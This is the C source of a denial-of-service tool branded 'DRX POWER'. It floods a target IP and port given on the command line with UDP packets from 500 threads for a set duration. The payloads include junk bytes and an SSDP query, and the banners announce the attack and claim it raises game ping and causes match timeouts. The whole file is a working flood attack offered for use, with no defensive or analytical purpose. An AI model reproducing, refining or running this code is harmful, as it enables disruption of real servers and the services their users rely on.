#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <time.h>

// [SECURITY] OWNER TAG
#define OWNER_SECRET "OWNER :- @DRX_POWER"

// POWERFUL PAYLOADS FOR 699ms PING
char *payloads[] = {
    "\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x01\x02\x03\x04", 
    "M-SEARCH * HTTP/1.1\r\nHOST: 255.255.255.255:1900\r\nST: ssdp:all\r\nMX: 3\r\n\r\n", 
    "SNQUERY: 127.0.0.1:AAAAAA:xsvr:699ms_MODE", 
    "\x50\x49\x4e\x47\x20\x46\x52\x45\x45\x5a\x45\x52" 
};

struct attack_config {
    char *ip;
    int port;
    int duration;
};

// HIGH-SPEED FLOOD FUNCTION
void *server_freezer(void *arg) {
    struct attack_config *config = (struct attack_config *)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return NULL;

    int buffer_size = 1024 * 1024;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buffer_size, sizeof(buffer_size));

    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(config->port);
    server_addr.sin_addr.s_addr = inet_addr(config->ip);

    time_t end_time = time(NULL) + config->duration;
    
    while (time(NULL) < end_time) {
        for(int i = 0; i < 4; i++) {
            sendto(sock, payloads[i], strlen(payloads[i]), 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
        }
    }

    close(sock);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("\x1b[1;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n");
        printf("⚠️  DRX POWER SYSTEM ERROR\nUsage: ./drx <IP> <PORT> <TIME>\n");
        printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\x1b[0m");
        return 1;
    }

    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int target_duration = atoi(argv[3]);

    printf("\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n");
    printf("\033[1;33m🚀 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐄𝐍𝐓 𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘 𝐁𝐘 𝐃𝐑𝐗\n");
    printf("\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n");
    printf("\033[1;37m🎯 𝐓𝐚𝐫𝐠𝐞𝐭   : \033[1;32m%s:%d\n", target_ip, target_port);
    printf("\033[1;37m🕒 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧 : \033[1;32m%d 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n", target_duration);
    printf("\033[1;37m⚡ 𝐓𝐡𝐫𝐞𝐚𝐝𝐬  : \033[1;32m500 (𝐌𝐚𝐱-𝐏𝐨𝐰𝐞𝐫)\n");
    printf("\033[1;37m🛰️  𝐌𝐨𝐝𝐞     : \033[1;32m699𝐦𝐬 𝐏𝐢𝐧𝐠 + 𝐌𝐚𝐭𝐜𝐡 𝐓𝐢𝐦𝐞𝐨𝐮𝐭\n");
    printf("\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m\n");

    int thread_count = 500; // Updated to 500 threads
    pthread_t threads[thread_count];
    struct attack_config config = {target_ip, target_port, target_duration};

    for (int i = 0; i < thread_count; i++) {
        pthread_create(&threads[i], NULL, server_freezer, &config);
    }

    // Wait for attack completion
    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("\n\033[1;32m✅ [ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐅𝐈𝐍𝐈𝐒𝐇𝐄𝐃 ] - 𝐒𝐄𝐑𝐕𝐄𝐑 𝐑𝐄𝐋𝐄𝐀𝐒𝐄𝐃\033[0m\n");
    return 0;
}
